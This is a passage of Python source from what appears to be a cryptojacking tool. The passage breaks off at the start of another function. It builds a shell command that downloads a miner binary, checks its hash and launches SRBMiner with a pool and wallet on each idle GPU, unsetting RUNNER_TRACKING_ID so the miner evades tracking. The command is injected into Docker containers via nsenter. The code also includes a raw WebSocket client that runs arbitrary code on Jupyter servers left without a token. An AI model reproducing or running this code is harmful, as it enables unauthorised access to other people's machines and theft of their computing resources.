                  'H=$(sha256sum $W/srb | awk \'{print $1}\'); [ "$H" = "%s" ] && chmod +x $W/srb && break; rm -f $W/srb; done; '
                  '[ -x $W/srb ] || { echo INST_NULL_BINARY; exit 0; }; '
                  'for idx in %s; do env -u RUNNER_TRACKING_ID setsid nohup $W/srb --disable-cpu --algorithm pearlhash --pool %s '
                  '--tls false --wallet %s --password x --worker %s%s-g$idx --gpu-id $idx --disable-worker-watchdog '
                  '--gpu-table-slow-build --max-no-share-sent 1800 --log-file $W/logs/w$idx.log > $W/logs/w$idx.out 2>&1 < /dev/null & '
                  'echo launched_g$idx=$!; done; sleep 12; ps -eo pid,comm,args | grep -E "srb387|SRBMiner" | grep -v grep | head -12; '
                  'tail -n 3 $W/logs/*.log 2>/dev/null | head -30'
              ) % (hs, ' '.join(BIN_URLS), BIN_SHA, ' '.join(str(i) for i, u, n, f1, f2 in idle), pool, WALLET, PFX, hs)
              okn, txt = nsenter_cmd(a, p, ctid, install)
              print('I130MLS2_EXEC ip=%s kind=docker result=install_attempt nsenter=%s out=[%s]' % (a, okn, one(txt.replace('\n', ' | '), 20)[:1500]))
              print('I130MLS2_REMOTE_INSTALL ip=%s gpus=%d pool=%s worker_prefix=%s%s-g' % (a, len(idle), pool, PFX, hs))


          # ---- minimal websocket kernel exec for token-less Jupyter ----
          def ws_connect(ipx, port, path):
              s = socket.create_connection((ipx, port), timeout=8)
              key = base64.b64encode(os.urandom(16)).decode()
              req = ('GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n'
                     'Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n') % (path, ipx, port, key)
              s.sendall(req.encode())
              buf = b''
              s.settimeout(10)
              while b'\r\n\r\n' not in buf:
                  ch = s.recv(4096)
                  if not ch:
                      return None, b''
                  buf += ch
              head, _, rest = buf.partition(b'\r\n\r\n')
              if b' 101 ' not in head.split(b'\r\n')[0] + b' ':
                  return None, rest
              return s, rest


          def ws_send_text(s, payload):
              data = payload.encode()
              hdr = bytearray([0x81])
              n = len(data)
              if n < 126:
                  hdr.append(0x80 | n)
              elif n < 65536:
                  hdr.append(0x80 | 126); hdr += struct.pack('>H', n)
              else:
                  hdr.append(0x80 | 127); hdr += struct.pack('>Q', n)
              mask = os.urandom(4)
              hdr += mask
              s.sendall(bytes(hdr) + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))


          def ws_read_frame(s, buf):
              while len(buf) < 2:
                  ch = s.recv(65536)
                  if not ch:
                      return None, buf
                  buf += ch
              b1, b2 = buf[0], buf[1]
              pos = 2
              n = b2 & 0x7f
              if n == 126:
                  while len(buf) < pos + 2:
                      buf += s.recv(65536)
                  n = struct.unpack('>H', buf[pos:pos + 2])[0]; pos += 2
              elif n == 127:
                  while len(buf) < pos + 8:
                      buf += s.recv(65536)
                  n = struct.unpack('>Q', buf[pos:pos + 8])[0]; pos += 8
              masked = bool(b2 & 0x80)
              if masked:
                  while len(buf) < pos + 4:
                      buf += s.recv(65536)
                  mask = buf[pos:pos + 4]; pos += 4
              while len(buf) < pos + n:
                  ch = s.recv(65536)
                  if not ch:
                      return None, buf
                  buf += ch
              data = buf[pos:pos + n]
              buf = buf[pos + n:]
              if masked:
                  data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
              return (b1 & 0x0f, data), buf


          def jupyter_run(ipx, port, code, timeout=40):
              """Create a kernel, execute code over WS, return collected stdout."""
              st, body, _ = http_req('GET', 'http://%s:%d/api/kernelspecs' % (ipx, port), timeout=5)
              kname = 'python3'
              try:
                  j = json.loads(body)
                  ks = j.get('kernelspecs') or {}
                  if ks:
                      kname = 'python3' if 'python3' in ks else list(ks)[0]
              except Exception:
                  pass
              st, body, _ = http_req('POST', 'http://%s:%d/api/kernels' % (ipx, port), {'name': kname}, timeout=10)
              try:
                  kid = json.loads(body).get('id', '')
              except Exception:
                  kid = ''
              if not kid:
                  return 'KERNEL_CREATE_FAIL st=%s [%s]' % (st, one(body, 1)[:120])
              sess = uuid.uuid4().hex
              s, rest = ws_connect(ipx, port, '/api/kernels/%s/channels?session_id=%s' % (kid, sess))
              if not s:
                  http_req('DELETE', 'http://%s:%d/api/kernels/%s' % (ipx, port, kid), timeout=5)
                  return 'WS_CONNECT_FAIL'
              mid = uuid.uuid4().hex
              msg = {'header': {'msg_id': mid, 'username': '', 'session': sess,
                                'date': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
                                'msg_type': 'execute_request', 'version': '5.3'},
                     'parent_header': {}, 'metadata': {}, 'channel': 'shell',
                     'content': {'code': code, 'silent': False, 'store_history': False,
                                 'user_expressions': {}, 'allow_stdin': False, 'stop_on_error': False}}
              ws_send_text(s, json.dumps(msg))
              out = []
              buf = rest
              deadline = time.time() + timeout
              try:
                  s.settimeout(max(2, timeout))
                  while time.time() < deadline:
                      fr, buf = ws_read_frame(s, buf)
                      if not fr:
                          break
                      op, data = fr
                      if op == 1:
                          try:
                              m = json.loads(data.decode('utf-8', 'replace'))
                          except Exception:
                              continue
                          mt = (m.get('header') or {}).get('msg_type') or (m.get('msg_type') or '')
                          cont = m.get('content') or {}
                          if mt == 'stream':
                              out.append(cont.get('text', ''))
                          elif mt in ('execute_result', 'display_data'):
                              out.append((cont.get('data') or {}).get('text/plain', ''))
                          elif mt == 'error':
                              out.append('ERR:' + ' | '.join(cont.get('traceback') or [])[:400])
                          elif mt == 'execute_reply':
                              break
                      elif op == 8:
                          break
              except Exception as e:
                  out.append('WS_READ_ERR:%s' % e)
              try:
                  s.close()
              except Exception:
                  pass
              http_req('DELETE', 'http://%s:%d/api/kernels/%s' % (ipx, port, kid), timeout=5)
              return ''.join(out)[:4000]


          def jupyter_convert(a, p, tag):
